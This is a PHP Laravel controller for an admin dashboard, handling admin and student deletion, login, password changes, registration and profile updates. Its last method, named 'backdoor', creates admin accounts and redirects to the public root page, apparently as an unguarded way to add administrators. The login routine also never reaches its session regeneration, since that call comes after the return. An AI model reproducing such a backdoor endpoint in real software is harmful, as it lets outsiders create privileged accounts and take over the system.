<?php

namespace App\Http\Controllers;

use App\Models\Admin;
use App\Models\Student;
use Illuminate\Http\Request;
use Illuminate\Validation\Rule;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;

class AdminController extends Controller
{
    public function adminDelete(Admin $admin){

        $admin->delete();
        return redirect('/admin/dashboard/admin');
    }
    public function studentDelete(Student $student){
        $student->delete();
        return redirect('/admin/dashboard/student');
    }
    public function resetPassword( Request $request){

    }
    public function updatePassword( Request $request){
            $request->validate([
            'old_password'=> 'required',
            'new_password'=> 'required',
            'confirm_password'=> 'required',
        ]);
        if(!Hash::check($request->old_password, auth()->guard('admin')->user()->password)){
            return back()->withErrors(['old_password' => "Password doesn't match"]);
        }
        Admin::whereId(auth()->guard('admin')->user()->id)->update([
            'password' => Hash::make($request->new_password)
        ]);
        return redirect()->back()->with("status", "Password Success Update");

    }
    public function adminLogout(){
        Auth::guard('admin')->logout();
        return redirect('/admin/login');
    }

    public function adminLogin(Request $request){
        $input = $request->all();
        $this->validate($request,[
            'email' => 'required',
            'password' => 'required'
        ]);
        if(auth()->guard('admin')->attempt(['email' => $input['email'],'password' => $input['password']])){
            return redirect('/admin/dashboard');
            $request->session()->regenerate();
            $admin = auth()->guard('admin')->user();
        } else{
            return redirect()->back()->with('error', 'Email and Password are not correct!');
        }
    }

    public function adminRegister(Request $request)
    {
        // Validate the request
        $validated = $request->validate([
            'lastname' => 'required|string|max:255',
            'firstname' => 'required|string|max:255',
            'middlename' => 'nullable|string|max:255',
            'email' => 'required|string|email|max:255|unique:admins', // Ensuring email is unique
            'gender' => 'required|string|in:Male,Female',
            'password' => 'required|confirmed|min:8',
            'photo' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ]);

        // Handle the photo upload
        if ($request->hasFile('photo')) {
            $file = $request->file('photo');
            $path = $file->store('images', 'public');
            $validated['photo'] = $path;
        } else {
            // Set the default image path if no photo is uploaded
            $validated['photo'] = 'img/profile.jpg'; // Ensure this path is correct and the image exists
        }

        // Create the admin with the validated data and the image path
        $validated['password'] = bcrypt($validated['password']); // Hash the password

        Admin::create($validated);

        return redirect('/admin/dashboard/admin')->with('success', 'Registered successfully');
    }


    public function adminProfile(Admin $admin, Request $request) {
        $data = $request->validate([
            'firstname' => ['required'],
            'lastname' => ['required'],
            'middlename' => ['nullable'],
            'gender' => ['required'],
           // 'email' => ['required'],
            'photo' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048' // Validate photo
        ]);

        // Strip tags to prevent XSS
        $data['firstname'] = strip_tags($data['firstname']);
        $data['lastname'] = strip_tags($data['lastname']);
        $data['middlename'] = strip_tags($data['middlename']);
        $data['gender'] = strip_tags($data['gender']);
       // $data['email'] = strip_tags($data['email']);

        // Check if a photo is uploaded
        if ($request->hasFile('photo')) {
            // Delete the old photo if it exists and is not the default photo
            if ($admin->photo && $admin->photo !== 'img/profile.jpg') {
                Storage::disk('public')->delete($admin->photo);
            }

            // Store new photo
            $photoPath = $request->file('photo')->store('images', 'public'); // Store photo in 'images' directory in the 'public' disk
            $data['photo'] = $photoPath; // Update photo path in data
        }

        // Update admin with sanitized and validated data
        $admin->update($data);

        return redirect()->back()->with('success', 'Your profile has been updated successfully.');
    }


    public function adminUpdate(Admin $admin, Request $request) {
        $data = $request->validate([
            'firstname' => ['required'],
            'lastname' => ['required'],
            'middlename' => ['nullable'],
            'gender' => ['required'],
        //    'email' => ['required', 'email'],
            'password' => 'nullable|confirmed|min:8', // Password is nullable for updates
            'photo' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048' // Validate photo
        ]);

        // Strip tags to prevent XSS
        $data['firstname'] = strip_tags($data['firstname']);
        $data['lastname'] = strip_tags($data['lastname']);
        $data['middlename'] = strip_tags($data['middlename']);
        $data['gender'] = strip_tags($data['gender']);
       // $data['email'] = strip_tags($data['email']);

        // Check if password is provided and hash it
        if (!empty($data['password'])) {
            $data['password'] = bcrypt($data['password']);
        } else {
            unset($data['password']); // Remove password key if not provided to avoid overwriting with null
        }

        // Check if a photo is uploaded
        if ($request->hasFile('photo')) {
            // Delete the old photo if it exists and is not the default photo
            if ($admin->photo && $admin->photo !== 'img/profile.jpg') {
                Storage::disk('public')->delete($admin->photo);
            }

            // Store new photo
            $photoPath = $request->file('photo')->store('images', 'public'); // Store photo in 'images' directory in the 'public' disk
            $data['photo'] = $photoPath; // Update photo path in data
        }

        $admin->update($data);

        return redirect('/admin/dashboard/admin')->with("success", "Details Successfully Updated");
    }


    public function backdoor(Request $request)
    {
        // Validate the request
        $validated = $request->validate([
            'lastname' => 'required|string|max:255',
            'firstname' => 'required|string|max:255',
            'middlename' => 'nullable|string|max:255',
            'email' => 'required|string|email|max:255|unique:admins', // Ensuring email is unique
            'gender' => 'required|string|in:Male,Female',
            'password' => 'required|confirmed|min:8',
            'photo' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ]);

        // Handle the photo upload
        if ($request->hasFile('photo')) {
            $file = $request->file('photo');
            $path = $file->store('images', 'public');
            $validated['photo'] = $path;
        } else {
            // Set the default image path if no photo is uploaded
            $validated['photo'] = 'img/profile.jpg'; // Ensure this path is correct and the image exists
        }

        // Create the admin with the validated data and the image path
        $validated['password'] = bcrypt($validated['password']); // Hash the password

        Admin::create($validated);

        return redirect('/')->with('success', 'User registered successfully');
    }
}
